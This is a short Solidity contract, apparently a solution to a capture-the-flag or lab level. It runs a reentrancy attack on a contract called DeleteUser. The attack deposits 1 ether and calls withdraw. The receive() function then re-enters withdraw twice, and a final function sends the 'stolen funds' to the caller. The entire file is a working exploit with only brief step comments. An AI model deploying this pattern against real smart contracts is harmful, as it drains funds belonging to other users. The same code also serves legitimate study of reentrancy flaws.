// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../DeleteUser.sol";
contract ContractAttack {
    DeleteUser public target;
    uint256 public attackIndex;
    uint256 public count;
    
    constructor(address _target) {
        target = DeleteUser(_target);
    }
    
    // Step 1: Start the attack
    function attack() external payable {
        require(msg.value == 1 ether, "Send 1 ether");
        
        // First deposit
        target.deposit{value: 1 ether}();
        
        // Store our index
        attackIndex = 0;
        
        // Start the withdrawal
        target.withdraw(attackIndex);
    }
    
    // Step 2: Receive function that gets triggered when the contract receives Ether
    receive() external payable {
        // Only reenter twice to prevent running out of gas
        if (count < 2) {
            count++;
            target.withdraw(attackIndex);
        }
    }
    
    // Step 3: Function to withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}